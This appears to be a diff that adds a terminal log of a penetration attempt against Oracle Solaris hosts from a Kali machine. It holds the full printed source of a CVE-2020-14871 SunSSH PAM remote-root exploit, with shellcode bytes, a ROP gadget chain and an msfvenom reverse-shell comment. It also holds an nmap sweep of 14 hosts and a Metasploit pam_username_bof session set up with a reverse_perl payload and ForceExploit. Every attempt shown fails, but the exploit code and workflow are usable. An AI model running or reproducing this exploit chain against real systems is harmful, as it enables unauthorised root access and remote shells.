@@ -1,0 +1,563 @@
+──(root㉿kali)-[~]
+└─# searchsploit oracle solaris
+--------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
+ Exploit Title                                                                                                                         |  Path
+--------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
+Oracle Solaris - 'nfslogd' Insecure Temporary File Creation                                                                            | solaris/local/34313.txt
+Oracle Solaris - 'rdist' Privilege Escalation                                                                                          | solaris/dos/34309.txt
+Oracle Solaris - 'su' Crash                                                                                                            | solaris/dos/15245.txt
+Oracle Solaris 11.1/11.3 (RSH) - 'Stack Clash' Local Privilege Escalation                                                              | solaris_x86/local/42270.c
+Oracle Solaris 8/9/10 - 'flar' Insecure Temporary File Creation                                                                        | solaris/local/34311.sh
+Oracle Solaris Common Desktop Environment 1.6 - Local Privilege Escalation                                                             | solaris/local/48359.c
+Oracle Solaris Management Console - WBEM Insecure Temporary File Creation                                                              | solaris/local/34314.sh
+--------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
+Shellcodes: No Results
+                                                                                                                                                                         
+┌──(root㉿kali)-[~]
+└─# searchsploit --cve CVE-2020-14871
+--------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
+ Exploit Title                                                                                                                         |  Path
+--------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
+Solaris SunSSH 11.0 x86 - libpam Remote Root                                                                                           | solaris/remote/49261.c
+Solaris SunSSH 11.0 x86 - libpam Remote Root (2)                                                                                       | solaris/remote/49896.py
+Solaris SunSSH 11.0 x86 - libpam Remote Root (3)                                                                                       | solaris/remote/50039.py
+
+ran the scripts found above as shown below:
+
+─(root㉿kali)-[~/Downloads]
+└─# python3 49896.py -t 10.159.114.41
+Length => 1027
+Traceback (most recent call last):
+  File "/root/Downloads/49896.py", line 34, in <module>
+    sock.connect(("192.168.1.2", 22))
+ConnectionRefusedError: [Errno 111] Connection refused
+                                                                  
+┌──(root㉿kali)-[~/Downloads]
+└─# python3 50039.py -t 10.159.114.41
+  File "/root/Downloads/50039.py", line 51
+    remote_host = "192.168.25.130”
+                  ^
+SyntaxError: unterminated string literal (detected at line 51)
+                                                                  
+┌──(root㉿kali)-[~/Downloads]
+└─# python3 50039.py -t 10.159.114.41
+  File "/root/Downloads/50039.py", line 51
+    remote_host = "192.168.25.130”
+                  ^
+SyntaxError: unterminated string literal (detected at line 51)
+                                                                  
+┌──(root㉿kali)-[~/Downloads]
+└─# ls
+ 49261.c
+ 49896.py
+ 50039.py
+ CBGreenMachine.ovpn
+'Gain SSH Access to Servers by Brute Force - CB Edition.docx'
+                                                                  
+┌──(root㉿kali)-[~/Downloads]
+└─# cat 50039.py  
+# Exploit Title: Solaris SunSSH 11.0 x86 - libpam Remote Root (3)
+# Exploit Author: Nathaniel Singer, Joe Rozner
+# Date: 09/11/2020
+# CVE: 2020-14871
+
+# Vulnerable Version(s): Oracle Solaris: 9 (some releases), 10 (all releases), 11.0
+# Description: CVE-2020-14871 is a critical pre-authentication (via SSH) stack-based buffer overflow vulnerability in the Pluggable Authentication Module (PAM) in Oracle Solaris. PAM is a dynamic authentication component that was integrated into Solaris back in 1997 as part of Solaris 2.6. The vulnerability received a CVSSv3 score of 10.0, the maximum possible score.
+
+# Vendor Homepage: https://www.oracle.com/solaris
+# Software Link: https://www.oracle.com/solaris/solaris10/downloads/solaris10-get-jsp-downloads.html
+# Tested on: Software Hash (md5): aae1452bb3d56baa3dcb8866ce7e4a08 2254110720: sol-10-u11-ga-x86-dvd.iso
+
+# Notes: We ran into an interesting LIBC descrepancy during testing. The sysenter gadget (0xfebbbbf4), last in the stage one chain, was accessible when the testing VM was running on a MacOS host, however, when we ran the vulnerable Solaris box on a Windows host, that gadget was not located at the same address and we actually were unable to find it anywhere in memory. Hopefully someone smarter than us can figure out why this is, but you may run into this during your testing as well.
+
+#!/usr/bin/python3
+
+from pwn import *
+
+########## BUILD ##########
+# mprotect shellcode, stage one to mark the page containing our shellcode as executable
+buf = b"\x31\xc0\x31\xc9\xbb\x01\x40\x04\x08\x66\xb8\x01\x40"
+buf += b"\xb1\x07\x4b\x48\x51\x50\x53\x53\x89\xe1\x31\xc0\xb0"
+buf += b"\x74\xcd\x91"
+
+# Actual stage two shellcode, drop into after mprotect call
+# ./msfvenom -p solaris/x86/shell_reverse_tcp -b "\x20\x09\x00\x0d\x0a" LHOST="192.168.1.215" LPORT=4444 -f python
+buf += b"<big bad effect here, as a bytestring; limit 512 bytes>"
+pad = b'A'* (512-len(buf))
+
+# manual assembly of ROP chain due to pwntools chainer bugs, DWORD returns :/
+g = []
+g.append(p32(0x080431c3)) #ebp overwrite to prevent ecx corrupt and crash
+g.append(p32(0xfed86ca3)) #mov eax, 0x74; ret
+g.append(p32(0x08072829)) #pop ebx; ret
+g.append(p32(0x08040101)) #write ecx value (0x0a) to address, prevents crash
+g.append(p32(0x0805ba07)) #pop ecx; pop edx; pop ebp
+g.append(p32(0x08046ee0)) #ptr(0x?,0x0x1000,0x7)
+g.append(p32(0x08043001)) #edx pointer to page+1 for mprotect
+g.append(p32(0x080431b8)) #unused ebp value
+g.append(p32(0x08072261)) #decrement edx so correct page addr
+g.append(p32(0xfefe2d8b)) #mov DWORD PTR [ecx+0x4],edx; xor eax; ret
+g.append(p32(0xfed86ca3)) #mov eax, 0x74; ret
+g.append(p32(0x0805ba08)) #pop edx; pop ebp; ret
+g.append(p32(0x080431b8)) #addr of shellcode
+g.append(p32(0xfed86ca3)) #unused ebx value
+g.append(p32(0xfebb56f6)) #sysenter (ret into sc via edx)
+chain = b''.join(g) #assemble the list into a bytestring, final rop chain
+print(f"Sending Exploit: {chain}")
+
+########## EXPLOIT ##########
+remote_host = "192.168.25.130”
+io = process(f'/usr/bin/ssh -l \"\" -o \"PreferredAuthentications keyboard-interactive\" {remote_host}', shell=True, stdin=PTY)
+
+io.recv() #username prompt
+io.sendline(buf + pad + chain) #exploit                                                                  
+┌──(root㉿kali)-[~/Downloads]
+└─# nano 50039.py                                            
+                                                                  
+┌──(root㉿kali)-[~/Downloads]
+└─# python3 50039.py -t 10.159.114.41
+  File "/root/Downloads/50039.py", line 51
+    remote_host = "192.168.110.128”
+                  ^
+SyntaxError: unterminated string literal (detected at line 51)
+                                                                  
+┌──(root㉿kali)-[~/Downloads]
+└─# nano 50039.py
+                                                                  
+┌──(root㉿kali)-[~/Downloads]
+└─# python3 50039.py -t 10.159.114.41
+  File "/root/Downloads/50039.py", line 51
+    remote_host = "192.168.110.128”
+                  ^
+SyntaxError: unterminated string literal (detected at line 51)
+
+┌──(root㉿kali)-[~]
+└─# nmap targets.txt -sV -sC
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-09-25 10:35 AKDT
+Failed to resolve "targets.txt".
+WARNING: No targets were specified, so 0 hosts scanned.
+Nmap done: 0 IP addresses (0 hosts up) scanned in 0.28 seconds
+      
+Ran nmap scan with all of the 14 IP addresses for Oracle Solaris from Tenable:
+                                                            
+┌──(root㉿kali)-[~]
+└─# nmap -iL  targets.txt -sV -sC
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-09-25 10:35 AKDT
+Stats: 0:00:14 elapsed; 0 hosts completed (14 up), 14 undergoing SYN Stealth Scan
+SYN Stealth Scan Timing: About 35.85% done; ETC: 10:36 (0:00:23 remaining)
+Stats: 0:01:44 elapsed; 0 hosts completed (14 up), 14 undergoing SYN Stealth Scan
+SYN Stealth Scan Timing: About 38.75% done; ETC: 10:40 (0:02:41 remaining)
+Stats: 0:03:27 elapsed; 0 hosts completed (14 up), 14 undergoing SYN Stealth Scan
+SYN Stealth Scan Timing: About 42.08% done; ETC: 10:44 (0:04:44 remaining)
+Stats: 0:08:22 elapsed; 0 hosts completed (14 up), 14 undergoing SYN Stealth Scan
+SYN Stealth Scan Timing: About 51.61% done; ETC: 10:52 (0:07:50 remaining)
+Nmap scan report for 10.159.44.156
+Host is up (0.00027s latency).
+All 1000 scanned ports on 10.159.44.156 are in ignored states.
+Not shown: 1000 filtered tcp ports (no-response)
+
+Nmap scan report for 10.161.59.68
+Host is up (0.00031s latency).
+All 1000 scanned ports on 10.161.59.68 are in ignored states.
+Not shown: 1000 filtered tcp ports (no-response)
+
+Nmap scan report for 10.159.114.39
+Host is up (0.00042s latency).
+All 1000 scanned ports on 10.159.114.39 are in ignored states.
+Not shown: 1000 filtered tcp ports (no-response)
+
+Nmap scan report for 5.194.202.142
+Host is up (0.00045s latency).
+All 1000 scanned ports on 5.194.202.142 are in ignored states.
+Not shown: 1000 filtered tcp ports (no-response)
+
+Nmap scan report for 10.159.44.153
+Host is up (0.00046s latency).
+All 1000 scanned ports on 10.159.44.153 are in ignored states.
+Not shown: 1000 filtered tcp ports (no-response)
+
+Nmap scan report for 5.194.202.148
+Host is up (0.00043s latency).
+All 1000 scanned ports on 5.194.202.148 are in ignored states.
+Not shown: 1000 filtered tcp ports (no-response)
+
+Nmap scan report for 10.159.44.154
+Host is up (0.00044s latency).
+All 1000 scanned ports on 10.159.44.154 are in ignored states.
+Not shown: 1000 filtered tcp ports (no-response)
+
+Nmap scan report for 5.194.202.140
+Host is up (0.00045s latency).
+All 1000 scanned ports on 5.194.202.140 are in ignored states.
+Not shown: 1000 filtered tcp ports (no-response)
+
+Nmap scan report for 10.159.114.40
+Host is up (0.00035s latency).
+All 1000 scanned ports on 10.159.114.40 are in ignored states.
+Not shown: 1000 filtered tcp ports (no-response)
+
+Nmap scan report for 10.161.59.69
+Host is up (0.00038s latency).
+All 1000 scanned ports on 10.161.59.69 are in ignored states.
+Not shown: 1000 filtered tcp ports (no-response)
+
+Nmap scan report for 5.211.4.253
+Host is up (0.00047s latency).
+All 1000 scanned ports on 5.211.4.253 are in ignored states.
+Not shown: 1000 filtered tcp ports (no-response)
+
+Nmap scan report for 10.161.28.44
+Host is up (0.00028s latency).
+All 1000 scanned ports on 10.161.28.44 are in ignored states.
+Not shown: 1000 filtered tcp ports (no-response)
+
+Nmap scan report for 10.159.44.155
+Host is up (0.0028s latency).
+All 1000 scanned ports on 10.159.44.155 are in ignored states.
+Not shown: 1000 filtered tcp ports (no-response)
+
+Nmap scan report for 10.159.114.41
+Host is up (0.00054s latency).
+All 1000 scanned ports on 10.159.114.41 are in ignored states.
+Not shown: 1000 filtered tcp ports (no-response)
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 14 IP addresses (14 hosts up) scanned in 584.94 seconds
+
+ran Metasploit to find exploits for Oracle Solaris on CVE-2020-14871
+Metasploit Documentation: https://docs.metasploit.com/
+
+msf6 > search oracle solaris
+
+Matching Modules
+================
+
+   #   Name                                                               Disclosure Date  Rank       Check  Description
+   -   ----                                                               ---------------  ----       -----  -----------
+   0   exploit/multi/browser/java_jre17_exec                              2012-08-26       excellent  No     Java 7 Applet Remote Code Execution
+   1     \_ target: Generic (Java Payload)                                .                .          .      .
+   2     \_ target: Windows Universal                                     .                .          .      .
+   3     \_ target: Linux x86                                             .                .          .      .
+   4   exploit/solaris/ssh/pam_username_bof                               2020-10-20       normal     Yes    Oracle Solaris SunSSH PAM parse_user_name() Buffer Overflow
+   5     \_ target: SunSSH 1.1.5 / Solaris 10u11 1/13 (x86) / VMware      .                .          .      .
+   6     \_ target: SunSSH 1.1.5 / Solaris 10u11 1/13 (x86) / VirtualBox  .                .          .      .
+   7   exploit/multi/misc/weblogic_deserialize_asyncresponseservice       2019-04-23       excellent  Yes    Oracle Weblogic Server Deserialization RCE - AsyncResponseService
+   8     \_ target: Unix                                                  .                .          .      .
+   9     \_ target: Windows                                               .                .          .      .
+   10    \_ target: Solaris                                               .                .          .      .
+   11  exploit/multi/misc/weblogic_deserialize_marshalledobject           2016-07-19       manual     No     Oracle Weblogic Server Deserialization RCE - MarshalledObject
+   12    \_ target: Unix                                                  .                .          .      .
+   13    \_ target: Windows                                               .                .          .      .
+   14    \_ target: Solaris                                               .                .          .      .
+   15  exploit/multi/misc/weblogic_deserialize_unicastref                 2017-01-25       excellent  No     Oracle Weblogic Server Deserialization RCE - RMI UnicastRef
+   16    \_ target: Unix                                                  .                .          .      .
+   17    \_ target: Windows                                               .                .          .      .
+   18    \_ target: Solaris                                               .                .          .      .
+   19  exploit/multi/misc/weblogic_deserialize_rawobject                  2015-01-28       excellent  No     Oracle Weblogic Server Deserialization RCE - Raw Object
+   20    \_ target: Unix                                                  .                .          .      .
+   21    \_ target: Windows                                               .                .          .      .
+   22    \_ target: Solaris                                               .                .          .      .
+   23  exploit/solaris/local/extremeparr_dtappgather_priv_esc             2017-04-24       excellent  Yes    Solaris 'EXTREMEPARR' dtappgather Privilege Escalation
+   24  exploit/solaris/local/rsh_stack_clash_priv_esc                     2017-06-19       good       Yes    Solaris RSH Stack Clash Privilege Escalation
+   25    \_ target: Automatic                                             .                .          .      .
+   26    \_ target: Solaris 11.1                                          .                .          .      .
+   27    \_ target: Solaris 11.3                                          .                .          .      .
+   28    \_ AKA: Stack Clash                                              .                .          .      .
+   29    \_ AKA: Solaris_rsh.c                                            .                .          .      .
+   30  post/solaris/escalate/pfexec                                       .                normal     No     Solaris pfexec Upgrade Shell
+   31  post/solaris/escalate/srsexec_readline                             2007-05-07       normal     Yes    Solaris srsexec Arbitrary File Reader
+   32  exploit/solaris/local/xscreensaver_log_priv_esc                    2019-10-16       excellent  Yes    Solaris xscreensaver log Privilege Escalation
+
+
+Interact with a module by name or index. For example info 32, use 32 or use exploit/solaris/local/xscreensaver_log_priv_esc                                         
+
+msf6 > use 4
+[*] Using configured payload cmd/unix/reverse_perl
+msf6 exploit(solaris/ssh/pam_username_bof) > options
+
+Module options (exploit/solaris/ssh/pam_username_bof):
+
+   Name    Current Setting  Required  Description
+   ----    ---------------  --------  -----------
+   RHOSTS                   yes       The target host(s), see https://docs.metasploit.com/docs/using-meta
+                                      sploit/basics/using-metasploit.html
+   RPORT   22               yes       The target port
+
+
+Payload options (cmd/unix/reverse_perl):
+
+   Name   Current Setting  Required  Description
+   ----   ---------------  --------  -----------
+   LHOST                   yes       The listen address (an interface may be specified)
+   LPORT  4444             yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   SunSSH 1.1.5 / Solaris 10u11 1/13 (x86) / VMware
+
+
+
+View the full module info with the info, or info -d command.
+
+msf6 exploit(solaris/ssh/pam_username_bof) > set rhosts 10.159.114.41
+rhosts => 10.159.114.41
+msf6 exploit(solaris/ssh/pam_username_bof) > options
+
+Module options (exploit/solaris/ssh/pam_username_bof):
+
+   Name    Current Setting  Required  Description
+   ----    ---------------  --------  -----------
+   RHOSTS  10.159.114.41    yes       The target host(s), see https://docs.metasploit.com/docs/using-meta
+                                      sploit/basics/using-metasploit.html
+   RPORT   22               yes       The target port
+
+
+Payload options (cmd/unix/reverse_perl):
+
+   Name   Current Setting  Required  Description
+   ----   ---------------  --------  -----------
+   LHOST                   yes       The listen address (an interface may be specified)
+   LPORT  4444             yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   SunSSH 1.1.5 / Solaris 10u11 1/13 (x86) / VMware
+
+
+
+View the full module info with the info, or info -d command.
+
+msf6 exploit(solaris/ssh/pam_username_bof) > set lhost 192.168.110.128
+lhost => 192.168.110.128
+msf6 exploit(solaris/ssh/pam_username_bof) > options
+
+Module options (exploit/solaris/ssh/pam_username_bof):
+
+   Name    Current Setting  Required  Description
+   ----    ---------------  --------  -----------
+   RHOSTS  10.159.114.41    yes       The target host(s), see https://docs.metasploit.com/docs/using-meta
+                                      sploit/basics/using-metasploit.html
+   RPORT   22               yes       The target port
+
+
+Payload options (cmd/unix/reverse_perl):
+
+   Name   Current Setting  Required  Description
+   ----   ---------------  --------  -----------
+   LHOST  192.168.110.128  yes       The listen address (an interface may be specified)
+   LPORT  4444             yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   SunSSH 1.1.5 / Solaris 10u11 1/13 (x86) / VMware
+
+
+
+View the full module info with the info, or info -d command.
+
+msf6 exploit(solaris/ssh/pam_username_bof) > show targets
+
+Exploit targets:
+=================
+
+    Id  Name
+    --  ----
+=>  0   SunSSH 1.1.5 / Solaris 10u11 1/13 (x86) / VMware
+    1   SunSSH 1.1.5 / Solaris 10u11 1/13 (x86) / VirtualBox
+
+
+msf6 exploit(solaris/ssh/pam_username_bof) > set target 0
+target => 0
+msf6 exploit(solaris/ssh/pam_username_bof) > options
+
+Module options (exploit/solaris/ssh/pam_username_bof):
+
+   Name    Current Setting  Required  Description
+   ----    ---------------  --------  -----------
+   RHOSTS  10.159.114.41    yes       The target host(s), see https://docs.metasploit.com/docs/using-meta
+                                      sploit/basics/using-metasploit.html
+   RPORT   22               yes       The target port
+
+
+Payload options (cmd/unix/reverse_perl):
+
+   Name   Current Setting  Required  Description
+   ----   ---------------  --------  -----------
+   LHOST  192.168.110.128  yes       The listen address (an interface may be specified)
+   LPORT  4444             yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   SunSSH 1.1.5 / Solaris 10u11 1/13 (x86) / VMware
+
+
+
+View the full module info with the info, or info -d command.
+
+msf6 exploit(solaris/ssh/pam_username_bof) > exploit
+
+[*] Started reverse TCP handler on 192.168.110.128:4444 
+[*] Running automatic check ("set AutoCheck false" to disable)
+[*] Using auxiliary/scanner/ssh/ssh_version as check
+[*] Error: 10.159.114.41: Errno::ECONNREFUSED Connection refused - connect(2) for 10.159.114.41:22
+[*] Scanned 1 of 1 hosts (100% complete)
+[-] Exploit aborted due to failure: bad-config: This module does not support check. auxiliary/scanner/ssh/ssh_version does not return a CheckCode. "set ForceExploit true" to override check result.
+[*] Exploit completed, but no session was created.
+WARNING:  database "msf" has a collation version mismatch
+DETAIL:  The database was created using collation version 2.38, but the operating system provides version 2.40.
+HINT:  Rebuild all objects in this database that use the default collation and run ALTER DATABASE msf REFRESH COLLATION VERSION, or build PostgreSQL with the right library version.
+msf6 exploit(solaris/ssh/pam_username_bof) > set ForceExploit true
+ForceExploit => true
+msf6 exploit(solaris/ssh/pam_username_bof) > options
+
+Module options (exploit/solaris/ssh/pam_username_bof):
+
+   Name    Current Setting  Required  Description
+   ----    ---------------  --------  -----------
+   RHOSTS  10.159.114.41    yes       The target host(s), see https://docs.metasploit.com/docs/using-meta
+                                      sploit/basics/using-metasploit.html
+   RPORT   22               yes       The target port
+
+
+Payload options (cmd/unix/reverse_perl):
+
+   Name   Current Setting  Required  Description
+   ----   ---------------  --------  -----------
+   LHOST  192.168.110.128  yes       The listen address (an interface may be specified)
+   LPORT  4444             yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   SunSSH 1.1.5 / Solaris 10u11 1/13 (x86) / VMware
+
+
+
+View the full module info with the info, or info -d command.
+
+msf6 exploit(solaris/ssh/pam_username_bof) > exploit
+
+[*] Started reverse TCP handler on 192.168.110.128:4444 
+[*] Running automatic check ("set AutoCheck false" to disable)
+[*] Using auxiliary/scanner/ssh/ssh_version as check
+[*] Error: 10.159.114.41: Errno::ECONNREFUSED Connection refused - connect(2) for 10.159.114.41:22
+[*] Scanned 1 of 1 hosts (100% complete)
+[!] This module does not support check. auxiliary/scanner/ssh/ssh_version does not return a CheckCode. ForceExploit is enabled, proceeding with exploitation.
+[*] Exploiting SunSSH 1.1.5 / Solaris 10u11 1/13 (x86) / VMware
+[*] Yeeting cmd/unix/reverse_perl at 10.159.114.41:22
+[-] Exploit failed [unreachable]: Rex::ConnectionTimeout The connection with (10.159.114.41:22) timed out.
+[*] Exploit completed, but no session was created.
+msf6 exploit(solaris/ssh/pam_username_bof) > exploit
+
+[*] Started reverse TCP handler on 192.168.110.128:4444 
+[*] Running automatic check ("set AutoCheck false" to disable)
+[*] Using auxiliary/scanner/ssh/ssh_version as check
+[*] Error: 10.159.114.41: Errno::ECONNREFUSED Connection refused - connect(2) for 10.159.114.41:22
+[*] Scanned 1 of 1 hosts (100% complete)
+[!] This module does not support check. auxiliary/scanner/ssh/ssh_version does not return a CheckCode. ForceExploit is enabled, proceeding with exploitation.
+[*] Exploiting SunSSH 1.1.5 / Solaris 10u11 1/13 (x86) / VMware
+[*] Yeeting cmd/unix/reverse_perl at 10.159.114.41:22
+[-] Exploit failed [unreachable]: Rex::ConnectionTimeout The connection with (10.159.114.41:22) timed out.
+[*] Exploit completed, but no session was created.
+msf6 exploit(solaris/ssh/pam_username_bof) > unset
+Usage: unset [-g] var1 var2 var3 ...
+
+The unset command is used to unset one or more variables.
+To flush all entries, specify 'all' as the variable name.
+With -g, operates on global datastore variables.
+
+msf6 exploit(solaris/ssh/pam_username_bof) > back
+msf6 > search oracle solaris
+
+Matching Modules
+================
+
+   #   Name                                                               Disclosure Date  Rank       Check  Description
+   -   ----                                                               ---------------  ----       -----  -----------
+   0   exploit/multi/browser/java_jre17_exec                              2012-08-26       excellent  No     Java 7 Applet Remote Code Execution
+   1     \_ target: Generic (Java Payload)                                .                .          .      .
+   2     \_ target: Windows Universal                                     .                .          .      .
+   3     \_ target: Linux x86                                             .                .          .      .
+   4   exploit/solaris/ssh/pam_username_bof                               2020-10-20       normal     Yes    Oracle Solaris SunSSH PAM parse_user_name() Buffer Overflow
+   5     \_ target: SunSSH 1.1.5 / Solaris 10u11 1/13 (x86) / VMware      .                .          .      .
+   6     \_ target: SunSSH 1.1.5 / Solaris 10u11 1/13 (x86) / VirtualBox  .                .          .      .
+   7   exploit/multi/misc/weblogic_deserialize_asyncresponseservice       2019-04-23       excellent  Yes    Oracle Weblogic Server Deserialization RCE - AsyncResponseService
+   8     \_ target: Unix                                                  .                .          .      .
+   9     \_ target: Windows                                               .                .          .      .
+   10    \_ target: Solaris                                               .                .          .      .
+   11  exploit/multi/misc/weblogic_deserialize_marshalledobject           2016-07-19       manual     No     Oracle Weblogic Server Deserialization RCE - MarshalledObject
+   12    \_ target: Unix                                                  .                .          .      .
+   13    \_ target: Windows                                               .                .          .      .
+   14    \_ target: Solaris                                               .                .          .      .
+   15  exploit/multi/misc/weblogic_deserialize_unicastref                 2017-01-25       excellent  No     Oracle Weblogic Server Deserialization RCE - RMI UnicastRef
+   16    \_ target: Unix                                                  .                .          .      .
+   17    \_ target: Windows                                               .                .          .      .
+   18    \_ target: Solaris                                               .                .          .      .
+   19  exploit/multi/misc/weblogic_deserialize_rawobject                  2015-01-28       excellent  No     Oracle Weblogic Server Deserialization RCE - Raw Object
+   20    \_ target: Unix                                                  .                .          .      .
+   21    \_ target: Windows                                               .                .          .      .
+   22    \_ target: Solaris                                               .                .          .      .
+   23  exploit/solaris/local/extremeparr_dtappgather_priv_esc             2017-04-24       excellent  Yes    Solaris 'EXTREMEPARR' dtappgather Privilege Escalation
+   24  exploit/solaris/local/rsh_stack_clash_priv_esc                     2017-06-19       good       Yes    Solaris RSH Stack Clash Privilege Escalation
+   25    \_ target: Automatic                                             .                .          .      .
+   26    \_ target: Solaris 11.1                                          .                .          .      .
+   27    \_ target: Solaris 11.3                                          .                .          .      .
+   28    \_ AKA: Stack Clash                                              .                .          .      .
+   29    \_ AKA: Solaris_rsh.c                                            .                .          .      .
+   30  post/solaris/escalate/pfexec                                       .                normal     No     Solaris pfexec Upgrade Shell
+   31  post/solaris/escalate/srsexec_readline                             2007-05-07       normal     Yes    Solaris srsexec Arbitrary File Reader
+   32  exploit/solaris/local/xscreensaver_log_priv_esc                    2019-10-16       excellent  Yes    Solaris xscreensaver log Privilege Escalation
+
+
+Interact with a module by name or index. For example info 32, use 32 or use exploit/solaris/local/xscreensaver_log_priv_esc                                                                                           
+
+msf6 > use 5
+[*] Additionally setting TARGET => SunSSH 1.1.5 / Solaris 10u11 1/13 (x86) / VMware
+[*] Using configured payload cmd/unix/reverse_perl
+msf6 exploit(solaris/ssh/pam_username_bof) > back
+msf6 > use 4
+[*] Using configured payload cmd/unix/reverse_perl
+msf6 exploit(solaris/ssh/pam_username_bof) > options
+
+Module options (exploit/solaris/ssh/pam_username_bof):
+
+   Name    Current Setting  Required  Description
+   ----    ---------------  --------  -----------
+   RHOSTS  10.159.114.41    yes       The target host(s), see https://docs.metasploit.com/docs/using-meta
+                                      sploit/basics/using-metasploit.html
+   RPORT   22               yes       The target port
+
+
+Payload options (cmd/unix/reverse_perl):
+
+   Name   Current Setting  Required  Description
+   ----   ---------------  --------  -----------
+   LHOST  192.168.110.128  yes       The listen address (an interface may be specified)
+   LPORT  4444             yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   SunSSH 1.1.5 / Solaris 10u11 1/13 (x86) / VMware
+
+
+
+View the full module info with the info, or info -d command.
+
+msf6 exploit(solaris/ssh/pam_username_bof) > 
